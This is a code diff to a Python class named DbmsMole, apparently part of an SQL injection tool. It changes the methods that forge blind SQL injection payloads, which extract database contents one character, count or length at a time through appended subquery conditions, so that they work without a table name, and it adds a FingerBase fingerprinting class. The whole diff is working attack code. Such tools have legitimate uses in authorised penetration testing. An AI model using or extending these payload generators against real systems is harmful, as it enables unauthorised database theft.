@@ -97,15 +97,33 @@ class DbmsMole():
     # which represents the concatenation of param fields.
     def _concat_fields(self, fields):
         pass
-        
+    
+    def set_good_finger(self, finger):
+        pass
+    
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
-        return ' and {op_par}' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
+        if len(table) > 0:
+            table = ' from ' + table
+            where = ' where ' + where
+        else:
+            where = ' '
+        return ' and {op_par}' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) ' + table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
         
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
-        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+self.parse_condition(where)+')'
+        if len(table) > 0:
+            table = ' from ' + table
+            where = ' where ' + where
+        else:
+            where = ' '
+        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  '+table+' '+self.parse_condition(where)+')'
 
     def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
-        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
+        if len(table) > 0:
+            table = ' from ' + table
+            where = ' where ' + where
+        else:
+            where = ' '
+        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+field+') '+table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
         
     def schema_count_query(self, columns, injectable_field):
         return self.forge_query(columns, "count(*)", 
@@ -258,4 +276,16 @@ class DbmsMole():
         return self.forge_blind_query(
             index, value, self._concat_fields(info['field'].split(',')), info['table']
         )
+
+
+class FingerBase:
+    def __init__(self, query, to_search):
+        self._query = query
+        self._to_search = to_search
+    
+    def build_query(self):
+        return self._query
+
+    def fingers_to_search(self):
+        return self._to_search
 
